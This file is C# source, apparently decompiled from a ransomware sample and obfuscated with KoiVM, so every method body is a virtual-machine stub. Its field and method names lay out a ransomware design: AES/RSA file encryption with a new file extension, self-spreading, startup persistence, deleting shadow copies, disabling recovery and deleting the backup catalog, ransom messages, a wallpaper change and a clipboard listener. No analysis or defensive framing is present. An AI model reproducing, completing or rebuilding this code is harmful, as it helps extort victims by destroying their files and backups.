using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using KoiVM.Runtime;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp;

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

		static NativeMethods()
		{
			VMEntry.Run(typeof(NativeMethods).TypeHandle, 20u, new object[0]);
		}
	}

	private static string userName;

	private static string userDir;

	public static string appMutexRun;

	public static bool encryptionAesRsa;

	public static string encryptedFileExtension;

	private static bool checkSpread;

	private static string spreadName;

	private static bool checkCopyRoaming;

	private static string processName;

	public static string appMutexRun2;

	private static bool checkStartupFolder;

	private static bool checkSleep;

	private static int sleepTextbox;

	private static string base64Image;

	public static string appMutexStartup;

	private static string droppedMessageTextbox;

	private static bool checkAdminPrivilage;

	private static bool checkdeleteShadowCopies;

	private static bool checkdisableRecoveryMode;

	private static bool checkdeleteBackupCatalog;

	public static string appMutexStartup2;

	public static string appMutex2;

	public static string staticSplit;

	public static string appMutex;

	public static readonly Regex appMutexRegex;

	private static string[] messages;

	private static string[] validExtensions;

	private static Random random;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		VMEntry.Run(typeof(Program).TypeHandle, 4u, new object[1] { args });
	}

	public static void Run()
	{
		VMEntry.Run(typeof(Program).TypeHandle, 5u, new object[0]);
	}

	public static byte[] random_bytes(int length)
	{
		return (byte[])VMEntry.Run(typeof(Program).TypeHandle, 6u, new object[1] { length });
	}

	public static string RandomString(int length)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 7u, new object[1] { length });
	}

	public static string RandomStringForExtension(int length)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 8u, new object[1] { length });
	}

	public static string Base64EncodeString(string plainText)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 9u, new object[1] { plainText });
	}

	public static string randomEncode(string plainText)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 10u, new object[1] { plainText });
	}

	public static string rsaKey()
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 12u, new object[0]);
	}

	public static string CreatePassword(int length)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 13u, new object[1] { length });
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		return (byte[])VMEntry.Run(typeof(Program).TypeHandle, 14u, new object[2] { bytesToBeEncrypted, passwordBytes });
	}

	public static void EncryptFile(string file)
	{
		VMEntry.Run(typeof(Program).TypeHandle, 15u, new object[1] { file });
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		return (string)VMEntry.Run(typeof(Program).TypeHandle, 16u, new object[2] { textToEncrypt, publicKeyString });
	}

	public static void SetWallpaper(string base64)
	{
		VMEntry.Run(typeof(Program).TypeHandle, 17u, new object[1] { base64 });
	}

	public Program()
	{
		VMEntry.Run(typeof(Program).TypeHandle, 18u, new object[1] { this });
	}

	static Program()
	{
		VMEntry.Run(typeof(Program).TypeHandle, 19u, new object[0]);
	}
}
